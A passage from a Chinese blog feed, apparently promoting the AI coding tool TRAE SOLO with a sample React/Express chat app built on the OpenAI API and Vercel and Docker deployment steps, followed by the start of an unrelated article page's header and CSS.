<span class="hljs-keyword">const</span> <span class="hljs-title function_">ImageLoader</span> = (<span class="hljs-params">{ src, alt, fallback }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"image-loader"</span>&gt;</span>
      {loading &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"loading-spinner"</span>&gt;</span>🔄 加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}
      {error &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error-message"</span>&gt;</span>
          {fallback || '❌ 图片加载失败'}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{src}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">{alt}</span>
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{()</span> =&gt;</span> setLoading(false)}
        onError={() =&gt; {
          setLoading(false);
          setError(true);
        }}
        style={{ display: loading || error ? 'none' : 'block' }}
      /&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<h5 data-id="heading-8">DiffView 高级应用</h5>
<ol>
<li><strong>分支对比</strong>：比较不同分支的代码差异</li>
<li><strong>历史版本对比</strong>：查看代码的演变过程</li>
<li><strong>合并预览</strong>：在合并代码前查看可能的冲突</li>
<li><strong>性能对比</strong>：分析不同实现方案的性能差异</li>
</ol>
<h3 data-id="heading-9">🚀 实战案例：AI聊天应用全流程开发</h3>
<p>让我们通过一个AI聊天应用的开发流程，来体验TRAE SOLO的全链路开发能力。</p>
<h4 data-id="heading-10">1. 需求分析与技术选型</h4>
<p><strong>需求</strong>：开发一个基于Web的AI聊天应用，支持多轮对话、历史记录保存、主题切换等功能。</p>
<p><strong>技术选型</strong>：</p>
<ul>
<li>前端：React 18 + TypeScript + Vite</li>
<li>后端：Node.js + Express</li>
<li>AI模型：OpenAI API</li>
</ul>
<h4 data-id="heading-11">2. 使用 SOLO coder 快速搭建基础架构</h4>
<h5 data-id="heading-12">前端核心组件</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 SOLO coder 生成的聊天应用主组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Message</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChatInput</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ChatInput'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageList</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageList'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> messagesEndRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 滚动到最新消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollToBottom</span> = (<span class="hljs-params"/>) =&gt; {
    messagesEndRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">scrollIntoView</span>({ <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> });
  };

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">scrollToBottom</span>();
  }, [messages]);

  <span class="hljs-comment">// 发送消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">if</span> (!text.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 添加用户消息</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">userMessage</span>: <span class="hljs-title class_">Message</span> = {
      <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(),
      text,
      <span class="hljs-attr">sender</span>: <span class="hljs-string">'user'</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
    };

    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, userMessage]);
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 调用AI接口</span>
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/chat'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: {
          <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">messages</span>: [...messages, userMessage] })
      });

      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();

      <span class="hljs-comment">// 添加AI回复</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">aiMessage</span>: <span class="hljs-title class_">Message</span> = {
        <span class="hljs-attr">id</span>: (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(),
        <span class="hljs-attr">text</span>: data.<span class="hljs-property">response</span>,
        <span class="hljs-attr">sender</span>: <span class="hljs-string">'ai'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
      };

      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, aiMessage]);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'聊天错误:'</span>, error);
      <span class="hljs-comment">// 添加错误消息</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">errorMessage</span>: <span class="hljs-title class_">Message</span> = {
        <span class="hljs-attr">id</span>: (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(),
        <span class="hljs-attr">text</span>: <span class="hljs-string">'抱歉，暂时无法响应，请稍后重试'</span>,
        <span class="hljs-attr">sender</span>: <span class="hljs-string">'ai'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
      };
      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, errorMessage]);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"chat-app"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageList</span> 
        <span class="hljs-attr">messages</span>=<span class="hljs-string">{messages}</span> 
        <span class="hljs-attr">loading</span>=<span class="hljs-string">{loading}</span>
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{messagesEndRef}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ChatInput</span> <span class="hljs-attr">onSendMessage</span>=<span class="hljs-string">{sendMessage}</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{loading}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ChatApp</span>;
</code></pre>
<h5 data-id="heading-13">后端服务</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 SOLO coder 生成的后端服务</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cors = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">Configuration</span>, <span class="hljs-title class_">OpenAIApi</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'openai'</span>);

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>());
app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());

<span class="hljs-comment">// 配置 OpenAI API</span>
<span class="hljs-keyword">const</span> configuration = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>({
  <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span>,
});
<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAIApi</span>(configuration);

<span class="hljs-comment">// 聊天接口</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/chat'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> { messages } = req.<span class="hljs-property">body</span>;

    <span class="hljs-comment">// 构建 OpenAI API 请求</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-title function_">createChatCompletion</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-3.5-turbo"</span>,
      <span class="hljs-attr">messages</span>: messages.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">msg</span> =&gt;</span> ({
        <span class="hljs-attr">role</span>: msg.<span class="hljs-property">sender</span> === <span class="hljs-string">'user'</span> ? <span class="hljs-string">'user'</span> : <span class="hljs-string">'assistant'</span>,
        <span class="hljs-attr">content</span>: msg.<span class="hljs-property">text</span>
      })),
      <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
    });

    res.<span class="hljs-title function_">json</span>({
      <span class="hljs-attr">response</span>: response.<span class="hljs-property">data</span>.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>?.<span class="hljs-property">content</span> || <span class="hljs-string">'未收到响应'</span>
    });
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'API错误:'</span>, error);
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'服务器内部错误'</span> });
  }
});

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3001</span>;
app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器运行在 http://localhost:<span class="hljs-subst">${PORT}</span>`</span>);
});
</code></pre>
<h4 data-id="heading-14">3. 使用 DiffView 优化代码结构</h4>
<p>在开发过程中，我们可能需要优化代码结构，例如将状态管理从组件内部迁移到Context中。使用DiffView可以清晰地看到这些变更：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 优化前：组件内部状态管理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-comment">// ...</span>
};

<span class="hljs-comment">// 优化后：使用 Context 进行状态管理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatContext</span> = createContext&lt;<span class="hljs-title class_">ChatContextType</span>&gt;({
  <span class="hljs-attr">messages</span>: [],
  <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">sendMessage</span>: <span class="hljs-keyword">async</span> () =&gt; {},
  <span class="hljs-attr">clearMessages</span>: <span class="hljs-function">() =&gt;</span> {}
});

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatProvider</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">children</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ children }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// 发送消息的逻辑</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-comment">// ... 实现逻辑</span>
  };

  <span class="hljs-comment">// 清空消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearMessages</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setMessages</span>([]);
  };

  <span class="hljs-keyword">const</span> value = {
    messages,
    loading,
    sendMessage,
    clearMessages
  };

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChatContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">ChatContext.Provider</span>&gt;</span></span>;
};

<span class="hljs-comment">// 自定义 Hook 方便使用 Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useChat</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ChatContext</span>);
  <span class="hljs-keyword">if</span> (!context) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useChat must be used within a ChatProvider'</span>);
  }
  <span class="hljs-keyword">return</span> context;
};

<span class="hljs-comment">// 优化后的组件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChatProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"chat-app"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">MessageList</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ChatInput</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ChatProvider</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-15">4. 部署与上线</h4>
<p>TRAE SOLO提供了一键式部署功能，支持多种部署方式：</p>
<ol>
<li>
<p><strong>Vercel 部署</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 SOLO coder 生成的 Vercel 部署脚本</span>
vercel init
vercel deploy
</code></pre>
</li>
<li>
<p><strong>Docker 容器化部署</strong></p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 使用 SOLO coder 生成的 Dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

RUN npm run build

EXPOSE 3000

CMD ["npm", "start"]
</code></pre>
</li>
</ol>
<h3 data-id="heading-16">⚠️ 避坑指南与最佳实践</h3>
<h4 data-id="heading-17">1. SOLO coder 使用注意事项</h4>
<ul>
<li><strong>避免模糊的提示</strong>：提示越具体，生成的代码质量越高</li>
<li><strong>验证生成的代码</strong>：虽然代码质量很高，但仍需验证逻辑正确性和安全性</li>
<li><strong>关注性能问题</strong>：对于生成的代码，要注意检查是否存在性能瓶颈</li>
<li><strong>保护API密钥</strong>：不要将敏感信息直接包含在生成的代码中</li>
</ul>
<h4 data-id="heading-18">2. DiffView 高效使用技巧</h4>
<ul>
<li><strong>设置合适的比较范围</strong>：避免比较过大的代码文件</li>
<li><strong>使用过滤功能</strong>：只查看关键代码的差异</li>
<li><strong>结合版本控制</strong>：与Git等版本控制工具结合使用，效果更佳</li>
<li><strong>定期保存对比结果</strong>：对于重要的代码变更，保存对比结果以便后续参考</li>
</ul>
<h4 data-id="heading-19">3. 全链路开发最佳实践</h4>
<ul>
<li><strong>采用模块化设计</strong>：将应用拆分为多个独立模块，提高可维护性</li>
<li><strong>使用TypeScript</strong>：增强代码的类型安全性</li>
<li><strong>实现自动化测试</strong>：确保应用的稳定性</li>
<li><strong>监控与日志</strong>：添加监控和日志功能，便于排查问题</li>
<li><strong>性能优化</strong>：定期进行性能分析和优化</li>
</ul>
<h3 data-id="heading-20">🎯 与传统开发工具的对比</h3>



































<table><thead><tr><th>特性</th><th>TRAE SOLO</th><th>传统开发工具链</th></tr></thead><tbody><tr><td>代码生成</td><td>✅ 智能生成高质量代码</td><td>❌ 需要手动编写</td></tr><tr><td>差异对比</td><td>✅ 可视化DiffView</td><td>⚠️ 依赖第三方工具</td></tr><tr><td>部署流程</td><td>✅ 一键式部署</td><td>❌ 手动配置复杂</td></tr><tr><td>全链路支持</td><td>✅ 从开发到部署的完整流程</td><td>❌ 工具链割裂</td></tr><tr><td>协作效率</td><td>✅ 团队协作功能完善</td><td>⚠️ 协作成本高</td></tr></tbody></table>
<h3 data-id="heading-21">📝 总结</h3>
<p>TRAE SOLO正式版作为一款全链路AI开发工具，通过SOLO coder、DiffView等核心功能，为AI应用开发带来了全新的范式。它不仅提高了开发效率，还提升了代码质量和协作体验。</p>
<p>通过本文的介绍和实战案例，相信你已经对TRAE SOLO有了深入的了解。无论你是AI开发新手还是资深开发者，TRAE SOLO都能成为你开发路上的得力助手！</p>
<p>让我们一起拥抱AI开发的新时代，用TRAE SOLO创造更多精彩的AI应用吧！ 🤗</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li><a href="https://trae.ai/docs" target="_blank" title="https://trae.ai/docs" ref="nofollow noopener noreferrer">TRAE SOLO 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2F" target="_blank" title="https://react.dev/" ref="nofollow noopener noreferrer">React 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2F" target="_blank" title="https://platform.openai.com/docs/" ref="nofollow noopener noreferrer">OpenAI API 文档</a></li>
</ul>
<p><strong>标签：</strong> #AI开发 #TRAE_SOLO #全链路开发 #前端技术 #工具实测</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[antd v3 select自定义下拉框内容失去焦点时会关闭下拉框]]></title>    <link>https://juejin.cn/post/7581619505568612378</link>    <guid>https://juejin.cn/post/7581619505568612378</guid>    <pubDate>2025-12-09T02:28:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505568612378" data-draft-id="7581374664327528499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="antd v3 select自定义下拉框内容失去焦点时会关闭下拉框"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T02:28:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小明记账簿_微信小程序"/> <meta itemprop="url" content="https://juejin.cn/user/1901536389893546"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            antd v3 select自定义下拉框内容失去焦点时会关闭下拉框
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1901536389893546/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小明记账簿_微信小程序
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:28:00.000Z" title="Tue Dec 09 2025 02:28:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";@keyframes spin{0%{transform:rotate(0)}to{transform:rotate(1turn)}}.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#36ace1;background-image:linear-gradient(90deg,rgba(217,234,251,.25) 3%,transparent 0),linear-gradient(1turn,rgba(217,234,251,.25) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{color:#36ace1}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"";display:block;position:absolute;left:0;top:0;bottom:0;margin:auto;background-image:url(data:image/png;base64,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);animation:spin 2s linear 1s infinite}.markdown-body h1{position:relative;font-size:30px;padding:12px 38px;margin:30px 0}.markdown-body h1:before{width:30px;height:30px;background-size:30px 30px}.markdown-body h2{position:relative;font-size:24px;padding:12px 36px;margin:28px 0}.markdown-body h2:before{width:28px;height:28px;background-size:28px 28px}.markdown-body h3{position:relative;font-size:18px;padding:4px 32px;margin:26px 0}.markdown-body h3:before{width:24px;height:24px;background-size:24px 24px}.markdown-body h4{position:relative;padding:4px 